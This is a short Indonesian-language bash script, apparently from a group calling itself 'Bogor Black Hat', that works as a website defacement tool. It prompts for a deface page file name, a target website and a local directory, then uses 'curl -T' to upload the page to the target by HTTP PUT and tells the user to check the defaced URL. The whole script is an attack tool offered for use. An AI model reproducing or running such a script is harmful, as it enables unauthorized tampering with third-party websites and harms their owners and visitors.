#
python2 secu.py
clear
sleep 2
echo "(:):::::::::::::::::::::::::::::::::::::(:)"|lolcat
echo " :  AUTHOR  = InYourXerXez               : "|lolcat
echo " :  TEAM    = GBLG~2E4H~BOGORblckHt~ITA  : "|lolcat
echo " :  SINCE   = 2K19-2K20                  : "|lolcat
echo " :  BOGOR BLACK HAT | GOBLOG CREW        : "|lolcat
echo "(:):::::::::::::::::::::::::::::::::::::(:)" |lolcat
toilet -f big Bogor BlackHat|lolcat
echo "■■■■■■■■■■■■■■■■●●●●●●●●●●●●■■■■■■■■■■■■■■■■"|lolcat
echo "□   SILAHKAN MASUKAN NAMA SC MU index.html □"|lolcat
echo "■■■■■■■■■■■■■■■■●●●●●●●●●●●●■■■■■■■■■■■■■■■■"|lolcat
echo -e "╭─ROOT@InYourXerXez7]" | lolcat
read -p "╰─#" sec;
echo ""
clear
echo ""
echo "NAMA SC MU { $sec }"|lolcat
echo "■■■■■■■■■■■■■■■■●●●●●●●●●●●●■■■■■■■■■■■■■■■■"|lolcat
echo "○    MASUKAN WEB TARGET MU BUJANG HEHE     ○"|lolcat
echo "■■■■■■■■■■■■■■■■●●●●●●●●●●●●■■■■■■■■■■■■■■■■"|lolcat
echo -e "╭─ROOT@InYourXerXez7]" | lolcat
read -p "╰─#" web;
echo ""
clear
echo ""
echo "WEB LU { $web }"|lolcat
echo "■■■■■■■■■■■■■■■■●●●●●●●●●●●●■■■■■■■■■■■■■■■■"|lolcat
echo "▪  MASUKAN MASUKAN DIRECKTORI PENYIMPAMAN  ▪"|lolcat
echo "■■■■■■■■■■■■■■■■●●●●●●●●●●●●■■■■■■■■■■■■■■■■"|lolcat
echo -e "╭─ROOT@InYourXerXez7]" | lolcat
read -p "╰─#" dir;
sleep 1
clear
echo "KITA KAWININ DULU ANTARA { $sec } { $web } DULU"|lolcat
sleep 1
echo "'"
sleep 1
echo "'"
sleep 1
echo "'"
curl -T /sdcard/$sec $web
curl -T $dir/$sec $web
curl -T /storage/emulated/0/$s3c $web
sleep 1
echo         "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
echo		"      COBA CEK TARGET DEFACH MU DI $web/$sec"|lolcat
echo		"            TERIMAKASIH DUDAH MEMAKAY TOOLS SAYA :*"|lolcat
echo         "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
echo "■■■■KAMU MAU EXIT Y/N■■■■■"|lolcat
read -p "╭─ " hehe;

if [ $hehe = Y ] || [ $hehe = y ]
then
echo "■■■■■■■■■■■■■□□□□□□□□□□□□□□□□■■■■■■■■■■■■■■■■"|lolcat
figlet -f big oke mau exit?? | lolcat
exit
fi

if [ $hehe = N ] || [ $hehe = n ]
then
sh we.sh
fi
